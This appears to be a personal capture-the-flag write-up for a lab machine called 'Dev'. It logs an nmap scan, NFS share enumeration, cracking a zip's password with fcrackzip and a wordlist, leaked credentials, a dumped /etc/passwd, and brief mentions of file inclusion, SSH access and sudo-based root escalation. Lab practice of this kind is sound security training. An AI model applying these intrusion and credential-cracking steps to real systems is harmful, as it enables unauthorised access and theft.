# Dev (172.16.2.130)
[29/July/2023 ::: 16:39] nmap scan

[29/July/2023 ::: 16:45] port 80 scan

[29/July/2023 ::: 16:46] port 8080 scan

[29/July/2023 ::: 16:54] port 2049 scan

[29/July/2023 ::: 16:57] Mounted into a directory

[29/July/2023 ::: 17:02] cracked the zip

[29/July/2023 ::: 17:08] app directory found in port 80

[29/July/2023 ::: 17:10] DB credentials found

[29/July/2023 ::: 17:18] Remote File Inclusion Attack Successfull

[29/July/2023 ::: 17:19] Potential SSH target discovered

[29/July/2023 ::: 17:23] SSH into the account Successfull

[29/July/2023 ::: 17:24] Sudo pprivileges as ZIP

[29/July/2023 ::: 17:28] Rooted the Machine

[29/July/2023 ::: 17:29] Flag Extracted

## nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-29 16:39 PKT
Nmap scan report for 172.16.2.130
Host is up (0.00058s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd96ec082fb1ea06cafc468a7e8ae355 (RSA)
|   256 56323b9f482de07e1bdf20f80360565e (ECDSA)
|_  256 95dd20ee6f01b6e1432e3cf438035b36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Bolt - Installation error
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      32965/udp6  mountd
|   100005  1,2,3      42209/tcp   mountd
|   100005  1,2,3      52173/tcp6  mountd
|   100005  1,2,3      53325/udp   mountd
|   100021  1,3,4      38299/tcp6  nlockmgr
|   100021  1,3,4      44143/tcp   nlockmgr
|   100021  1,3,4      49037/udp   nlockmgr
|   100021  1,3,4      55849/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
33907/tcp open  mountd   1-3 (RPC #100005)
42209/tcp open  mountd   1-3 (RPC #100005)
44143/tcp open  nlockmgr 1-4 (RPC #100021)
46549/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 00:0C:29:66:9D:BC (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms 172.16.2.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.36 seconds


### 80
Bolt Installation Error

Information disclosure


### 8080
PHP -info page

### 2049
┌──(wahaj㉿wahaj)-[~]└─$ showmount -e 172.16.2.130
Export list for 172.16.2.130:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16

## Exploitation


### save.zip
using fcrack to get  into the zip file

┌──(root㉿wahaj)-[/mnt/dev]
└─# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)


PASSWORD FOUND!!!!: pw == java101
                                       

#### todo.txt
- Figure out how to install the main website properly, the config file seems correct...
- - Update development website- 
- Keep coding in Java because it's awesome
- jp (possible person signature)


cant get into ssh yet, need jp password if the user exists

### config.yml
username: bolt
  password: I_love_java

### /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin

### flag.txt
# cd /root
# cat flag.txt
Congratz on rooting this box !


